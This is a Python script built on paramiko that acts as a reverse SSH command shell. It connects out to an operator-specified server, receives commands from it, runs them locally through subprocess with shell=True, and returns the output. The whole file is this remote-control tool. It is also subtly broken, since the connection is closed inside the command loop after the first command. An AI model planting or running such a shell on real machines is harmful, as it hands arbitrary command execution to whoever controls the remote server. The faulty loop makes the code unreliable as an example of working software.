import paramiko
import subprocess
import shlex

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    print(f'[DEBUG] Connected...')
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print(f'[DEBUG] ssh session is active')
        print(f'[DEBUG] trying to send message: {command}')
        ssh_session.send(command)
    print(f'[DEBUG] ssh session started to receive message')
    data = ssh_session.recv(1024).decode()
    print(f'[DEBUG] data received: {data}')
    print(data)
    while True:
        command = ssh_session.recv(1024)
        try:
            cmd = command.decode()
            if cmd == 'exit':
                client.close()
                break
            cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
            ssh_session.send(cmd_output or 'okey')
        except Exception as e:
            ssh_session.send(str(e))
        client.close()
    return


if __name__ == "__main__":
    import getpass
    user = input('Username: ')
    password = input('Password: ')
    # password = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input('Enter server port: ')
    ssh_command(ip, port, user, password, 'ClientConnected')